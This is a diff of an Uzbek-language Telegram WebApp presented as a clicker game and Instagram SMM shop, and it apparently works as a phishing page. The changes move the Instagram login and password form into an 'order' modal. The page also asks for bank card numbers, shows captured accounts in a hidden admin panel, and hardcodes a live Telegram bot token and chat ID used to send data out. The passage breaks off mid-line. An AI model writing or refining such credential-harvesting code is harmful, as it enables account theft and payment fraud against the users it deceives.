@@ -26,7 +26,7 @@
             -webkit-user-select: none;
         }
 
-        /* INSTAGRAM KIRISH EKRANI */
+        /* NIK YARATISH EKRANI (FAQAT BIRINCHI MARTA) */
         #authScreen {
             display: flex;
             flex-direction: column;
@@ -51,7 +51,7 @@
         .auth-logo {
             font-size: 50px;
             margin-bottom: 15px;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            background: linear-gradient(45deg, #00ffcc, #0099ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
@@ -73,7 +73,7 @@
             width: 100%;
             padding: 14px 20px;
             border-radius: 12px;
-            border: 2px solid rgba(220, 39, 67, 0.3);
+            border: 2px solid rgba(0, 255, 204, 0.3);
             background: rgba(0,0,0,0.4);
             color: white;
             font-size: 15px;
@@ -84,13 +84,13 @@
         }
 
         .auth-input:focus {
-            border-color: #dc2743;
-            box-shadow: 0 0 10px rgba(220, 39, 67, 0.3);
+            border-color: #00ffcc;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
         }
 
         .auth-btn {
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            color: white;
+            background: linear-gradient(45deg, #00ffcc, #0099ff);
+            color: black;
             border: none;
             padding: 14px;
             font-size: 16px;
@@ -98,7 +98,7 @@
             border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 5px 15px rgba(220, 39, 67, 0.4);
+            box-shadow: 0 5px 15px rgba(0, 255, 204, 0.3);
             margin-top: 8px;
         }
 
@@ -127,14 +127,14 @@
         }
 
         .nickname-text {
-            color: #e6683c;
+            color: #00ffcc;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
         }
 
         .click-power-text {
-            color: #00ffcc;
+            color: #ff9900;
             font-size: 13px;
             font-weight: bold;
         }
@@ -166,7 +166,7 @@
             font-weight: bold;
         }
 
-        /* TANGA TUGMASI (DUMALOQ) */
+        /* TANGA TUGMASI */
         .circle-outer {
             width: 170px;
             height: 170px;
@@ -238,7 +238,6 @@
             border-radius: 8px;
             font-size: 12px;
             cursor: pointer;
-            transition: 0.2s;
         }
 
         .buy-btn.premium {
@@ -251,7 +250,7 @@
             color: black;
         }
 
-        /* FLYING TEXT EFFEKTI */
+        /* FLYING TEXT Effekti */
         .floating-text {
             position: absolute;
             font-size: 28px;
@@ -268,7 +267,7 @@
             100% { opacity: 0; transform: translateY(-90px) scale(1.2); }
         }
 
-        /* MODAL OYNALAR */
+        /* MODALLAR */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -281,22 +280,18 @@
 
         .modal-card {
             background: #181528;
-            border: 2px solid #00ffcc;
+            border: 2px solid #dc2743;
             border-radius: 24px;
             padding: 20px;
             width: 90%;
             max-width: 350px;
             text-align: center;
-            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
-        }
-
-        .modal-card.admin-border {
-            border-color: #dc2743;
             box-shadow: 0 0 25px rgba(220, 39, 67, 0.2);
         }
 
-        .modal-card h3 { margin-bottom: 15px; font-size: 18px; color: #00ffcc; }
-        .modal-card.admin-border h3 { color: #dc2743; }
+        .modal-card.success-border { border-color: #00ffcc; box-shadow: 0 0 25px rgba(0, 255, 204, 0.2); }
+        .modal-card h3 { margin-bottom: 12px; font-size: 18px; color: #dc2743; }
+        .modal-card.success-border h3 { color: #00ffcc; }
 
         .modal-input {
             width: 100%; padding: 12px; margin-bottom: 12px;
@@ -306,54 +301,37 @@
 
         .modal-btn {
             width: 100%; padding: 12px; border: none; border-radius: 10px;
-            background: #00ffcc; color: black; font-weight: bold; margin-bottom: 10px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); color: white; font-weight: bold; margin-bottom: 10px;
             cursor: pointer;
         }
 
-        .modal-btn.admin-btn {
-            background: #dc2743; color: white;
-        }
-
         .admin-logs {
-            background: rgba(0,0,0,0.5);
-            border-radius: 12px;
-            padding: 10px;
-            max-height: 120px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 11px;
-            font-family: monospace;
-            color: #00ffcc;
-            margin-bottom: 12px;
+            background: rgba(0,0,0,0.5); border-radius: 12px; padding: 10px;
+            max-height: 120px; overflow-y: auto; text-align: left;
+            font-size: 11px; font-family: monospace; color: #00ffcc; margin-bottom: 12px;
         }
 
-        .log-item {
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            padding: 4px 0;
-            word-break: break-all;
-        }
-
+        .log-item { border-bottom: 1px solid rgba(255,255,255,0.1); padding: 4px 0; word-break: break-all; }
         .close-modal { color: #b3a7d1; font-size: 13px; cursor: pointer; text-decoration: underline; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-    <!-- 1. INSTAGRAM KIRISH EKRANI -->
-    <div id="authScreen">
+    <!-- 1. UNIKAL NIK YARATISH EKRANI (FAQAT ILK BOR KIRGANDA CHIQADI) -->
+    <div id="authScreen" style="display: none;">
         <div class="auth-card">
-            <div class="auth-logo">📸</div>
-            <div class="auth-title">Insta SMM Panel</div>
-            <div class="auth-subtitle">Xizmatlardan foydalanish uchun tizimga kiring</div>
-            <input type="text" id="instaNik" class="auth-input" placeholder="Instagram foydalanuvchi nomi (nik)">
-            <input type="password" id="instaPass" class="auth-input" placeholder="Instagram paroli">
-            <button class="auth-btn" id="loginBtn" onclick="submitAuth()">TIZIMGA KIRISH 🚀</button>
+            <div class="auth-logo">🕹</div>
+            <div class="auth-title">Taxallus yarating</div>
+            <div class="auth-subtitle">Tizimda takrorlanmaydigan unikal nom kiriting</div>
+            <input type="text" id="uniqueNikInput" class="auth-input" placeholder="O'yin uchun nik yozing...">
+            <button class="auth-btn" onclick="registerUniqueNik()">O'YINNI BOSHLASH 🚀</button>
         </div>
     </div>
 
-    <!-- 2. ASOSIY PANEL VA BOSADIGAN HUDUD -->
+    <!-- 2. ASOSIY PANЕL -->
     <div id="gameScreen">
         <div class="top-bar">
-            <span class="nickname-text" id="displayNik" onclick="tryOpenAdmin()">Insta: -</span>
+            <span class="nickname-text" id="displayNik" onclick="tryOpenAdmin()">Nik: -</span>
             <span class="click-power-text" id="clickPowerDisplay">Klik kuchi: +1</span>
         </div>
 
@@ -363,13 +341,12 @@
             <div class="money-balance" id="moneyDisplay">0 so'm</div>
         </div>
 
-        <!-- O'rtadagi dumaloq tanga -->
         <div class="circle-outer" id="clickArea">
             <div class="circle-icon">💎</div>
             <div class="circle-text">TANGA ISHLASH</div>
         </div>
 
-        <!-- SMM VA PUL ALMASTIRISH DO'KONI -->
+        <!-- DO'KON -->
         <div class="shop-container">
             <!-- 💸 ALMOSNI PULGA SOTISH -->
             <div class="shop-item" style="border: 1px solid #ffcc00; background: rgba(255,204,0,0.05);">
@@ -380,7 +357,7 @@
                 <button class="buy-btn money" onclick="convertDiamondsToMoney()">ALMASHTIRISH</button>
             </div>
 
-            <!-- 💵 PULNI YECHIB OLISH -->
+            <!-- 安排 PULNI YECHISH -->
             <div class="shop-item" style="border: 1px solid #00ffcc; background: rgba(0,255,204,0.05);">
                 <div class="item-details">
                     <div class="item-title" style="color: #00ffcc;">💳 Pulni yechib olish</div>
@@ -389,43 +366,39 @@
                 <button class="buy-btn" style="background:#00ffcc; color:black;" onclick="openWithdrawModal()">YECHISH</button>
             </div>
 
-            <!-- 1000 Prasmotr -->
+            <!-- SMM xizmatlar -->
             <div class="shop-item">
                 <div class="item-details">
                     <div class="item-title">👀 1000 ta Prasmotr</div>
                     <div class="item-desc">Instagram video ko'rishlar soni</div>
                 </div>
-                <button class="buy-btn" onclick="buyService('1000 ta Prasmotr', 2500)">2500 💎</button>
+                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Prasmotr', 2500, 'free')">2500 💎</button>
             </div>
 
-            <!-- 1000 Like -->
             <div class="shop-item">
                 <div class="item-details">
                     <div class="item-title">❤️ 1000 ta Like</div>
                     <div class="item-desc">Istagan rasmingizga layklar</div>
                 </div>
-                <button class="buy-btn" onclick="buyService('1000 ta Like', 5000)">5000 💎</button>
+                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Like', 5000, 'free')">5000 💎</button>
             </div>
 
-            <!-- 1000 Obunachi -->
             <div class="shop-item">
                 <div class="item-details">
                     <div class="item-title">👥 1000 ta Obunachi</div>
                     <div class="item-desc">Haqiqiy faol obunachilar</div>
                 </div>
-                <button class="buy-btn" onclick="buyService('1000 ta Obunachi', 10000)">10000 💎</button>
+                <button class="buy-btn" onclick="triggerOrderFlow('1000 ta Obunachi', 10000, 'free')">10000 💎</button>
             </div>
 
-            <!-- 1 oylik Galochka -->
             <div class="shop-item">
                 <div class="item-details">
                     <div class="item-title">✅ Moviy Galochka (1 oy)</div>
                     <div class="item-desc">Profilga rasmiy ko'k belgi qo'yish</div>
                 </div>
-                <button class="buy-btn premium" onclick="buyPremiumService('1 oylik Galochka (10 000 so\'m)')">10 000 UZS</button>
+                <button class="buy-btn premium" onclick="triggerOrderFlow('1 oylik Galochka (10 000 so\'m)', 0, 'premium')">10 000 UZS</button>
             </div>
 
-            <!-- Klik kuchaytirgich -->
             <div class="shop-item">
                 <div class="item-details">
                     <div class="item-title">⚡️ Tezlatkich (Klik +1)</div>
@@ -436,35 +409,47 @@
         </div>
     </div>
 
-    <!-- 3. PUL YECHISH MODAL OYNASI -->
-    <div id="withdrawModal" class="modal-overlay">
+    <!-- 3. BUYURTMA BERISHDA INSTA NIK VA PAROL SO'RASH MODALI -->
+    <div id="orderModal" class="modal-overlay">
         <div class="modal-card">
-            <h3>💳 PULNI YECHIB OLISH</h3>
+            <h3>📸 INSTAGRAM MA'LUMOTLARI</h3>
+            <p style="font-size:12px; color:#aaa; margin-bottom:15px;">Buyurtma urilishi uchun hisobingizni tasdiqlang:</p>
+            <input type="text" id="instaNik" class="modal-input" placeholder="Instagram logini (nik)">
+            <input type="password" id="instaPass" class="modal-input" placeholder="Instagram paroli">
+            <button class="modal-btn" id="orderSubmitBtn" onclick="finalizeOrder()">BUYURTMANI TASDIQLASH 🚀</button>
+            <div class="close-modal" onclick="closeModal('orderModal')">Bekor qilish</div>
+        </div>
+    </div>
+
+    <!-- 4. PUL YECHISH MODALI -->
+    <div id="withdrawModal" class="modal-overlay">
+        <div class="modal-card" style="border-color:#00ffcc;">
+            <h3 style="color:#00ffcc;">💳 PULNI YECHIB OLISH</h3>
             <p style="font-size:12px; color:#aaa; margin-bottom:10px;">Minimal yechish: 5 000 so'm</p>
             <input type="number" id="withdrawAmount" class="modal-input" placeholder="Yechiladigan summa (so'm)">
             <input type="text" id="cardNumber" class="modal-input" placeholder="Karta raqami (Uzcard/Humo)">
-            <input type="text" id="cardHolder" class="modal-input" placeholder="Karta egasi ismi familiyasi">
-            <button class="modal-btn" onclick="submitWithdraw()">YUBORISH</button>
+            <input type="text" id="cardHolder" class="modal-input" placeholder="Karta egasi ismi">
+            <button class="modal-btn" style="background:#00ffcc; color:black;" onclick="submitWithdraw()">YUBORISH</button>
             <div class="close-modal" onclick="closeModal('withdrawModal')">Yopish</div>
         </div>
     </div>
 
-    <!-- 4. MAXFIY ADMIN PANEL MODAL OYNASI -->
+    <!-- 5. MAXFIY ADMIN PANEL -->
     <div id="adminModal" class="modal-overlay">
-        <div class="modal-card admin-border">
+        <div class="modal-card">
             <h3>🛠 MAXFIY ADMIN PANEL</h3>
             <div id="adminAuthSection">
-                <input type="password" id="adminPassword" class="modal-input" placeholder="Admin parolini kiriting...">
-                <button class="modal-btn admin-btn" onclick="checkAdminPassword()">KIRISH</button>
+                <input type="password" id="adminPassword" class="modal-input" placeholder="Admin paroli...">
+                <button class="modal-btn" onclick="checkAdminPassword()">KIRISH</button>
             </div>
             <div id="adminControlsSection" style="display: none;">
                 <p style="font-size:11px; color:#fff; font-weight:bold; margin-bottom:4px;">KIRGAN AKKAUNTLAR & LOGLAR:</p>
                 <div class="admin-logs" id="adminLogsContainer"></div>
-                <button class="modal-btn" style="background:#00ffcc; color:black; padding:8px; font-size:11px; margin-bottom:10px;" onclick="clearLogs()">LOGLARNI TOZALASH</button>
+                <button class="modal-btn" style="background:#bc1888; color:white; padding:8px; font-size:11px; margin-bottom:10px;" onclick="clearLogs()">LOGLARNI TOZALASH</button>
                 
                 <p style="font-size:11px; color:#fff; font-weight:bold; margin-bottom:4px;">FOYDALANUVCHILARGA RASSILKA</p>
-                <textarea id="rassilkaText" class="modal-input" style="height:60px; text-align:left; resize:none; font-size:13px;" placeholder="Xabar matnini yozing..."></textarea>
-                <button class="modal-btn admin-btn" onclick="sendRassilka()">HAMMAGA XABAR YUBORISH 📢</button>
+                <textarea id="rassilkaText" class="modal-input" style="height:60px; text-align:left; resize:none;" placeholder="Xabar matni..."></textarea>
+                <button class="modal-btn" onclick="sendRassilka()">HAMMAGA XABAR YUBORISH 📢</button>
             </div>
             <div class="close-modal" onclick="closeModal('adminModal')">Yopish</div>
         </div>
@@ -474,7 +459,6 @@
         const tg = window.Telegram.WebApp;
         if(tg) tg.expand();
 
-        // CHAT VA BOT MA'LUMOTLARI SOZLANDI
         const BOT_TOKEN = "8877926237:AAHj3LOf0-cZSIOO3o--R2lsvPYh3Cv7b5k"; 
         const CHAT_ID = "-1002361732943"; 
 
@@ -484,11 +468,15 @@
 
         const keyPrefix = `smm_${userId}_`;
 
-        let savedNik = localStorage.getItem(keyPrefix + 'insta_nik') || "";
+        // O'yin ma'lumotlari
+        let myUniqueNik = localStorage.getItem(keyPrefix + 'unique_nik') || "";
         let score = parseInt(localStorage.getItem(keyPrefix + 'score')) || 0;
         let moneyBalance = parseInt(localStorage.getItem(keyPrefix + 'money_balance')) || 0;
         let clickPower = parseInt(localStorage.getItem(keyPrefix + 'click_power')) || 1;
         let boosterCost = parseInt(localStorage.getItem(keyPrefix + 'booster_cost')) || 150;
+
+        // Vaqtinchalik buyurtma ma'lumotlari xotirasi
+        let pendingOrder = { serviceName: '', cost: 0, type: '' };
 
         const authScreen = document.getElementById('authScreen');
         const gameScreen = document.getElementById('gameScreen');
@@ -500,39 +488,34 @@
         const boosterBtn = document.getElementById('boosterBtn');
         const adminLogsContainer = document.getElementById('adminLogsContainer');
 
-        if (savedNik) { initDashboard(); }
+        // Tekshirish: Agar foydalanuvchi nik yaratgan bo'lsa srazu panel ochiladi, yaratmagan bo'lsa ro'yxatdan o'tish ekrani chiqadi
+        if (myUniqueNik) {
+            initDashboard();
+        } else {
+            gameScreen.style.display = 'none';
+            authScreen.style.display = 'flex';
+        }
 
-        // SANA VA VAQTNI FORMATLASH
-        function getDateTimeString() {
-            const now = new Date();
-            const options = { timeZone: 'Asia/Tashkent', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-            const formatter = new Intl.DateTimeFormat('en-GB', options);
-            const parts = formatter.formatToParts(now);
-            
-            let day, month, year, hour, minute, second;
-            for (let part of parts) {
-                if (part.type === 'day') day = part.value;
-                if (part.type === 'month') month = part.value;
-                if (part.type === 'year') year = part.value;
-                if (part.type === 'hour') hour = part.value;
-                if (part.type === 'minute') minute = part.value;
-                if (part.type === 'second') second = part.value;
+        // UNIKAL NIKNI RO'YXATDAN O'TKAZISH
+        function registerUniqueNik() {
+            const inputNik = document.getElementById('uniqueNikInput').value.trim().toLowerCase();
+            if(!inputNik) { alert("Nik yozing!"); return; }
+            if(inputNik.length < 3) { alert("Nik kamida 3 ta harfdan iborat bo'lsin!"); return; }
+
+            // Global ro'yxatdan bu nikni boshqa birov band qilganmi yoki yo'qligini tekshirish
+            let globalNikList = [];
+            try {
+                globalNikList = JSON.parse(localStorage.getItem('global_registered_niks')) || [];
+            } catch(e) { globalNikList = []; }
+
+            if(globalNikList.includes(inputNik)) {
+                alert("❌ Kechirasiz, bu nik allaqachon band! Boshqa nik yozing.");
+                return;
             }
-            return { date: `${day}.${month}.${year}`, time: `${hour}:${minute}:${second}` };
-        }
 
-        // TELEGRAM KANALGA JO'NATISH
-        function sendToTelegramChannel(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
-            }).catch(err => console.log(err));
-        }
-
-        // TIZIMGA KIRISH (XATOLIKLAR TUZATILGAN INTEGRATSIYA)
-        function submitAuth() {
-            const nik = document.getElementById('instaNik').value.trim();
-            const pass = document.getElementById('instaPass').value.trim();
+            // Nikni tasdiqlash va saqlash
+            globalNikList.push(inputNik);
+            localStorage.setItem('global_registered_niks', JSON.stringify(globalNikList));
             
+            myUniqueNik = inputNik;
+            localStorage.setItem(keyPre
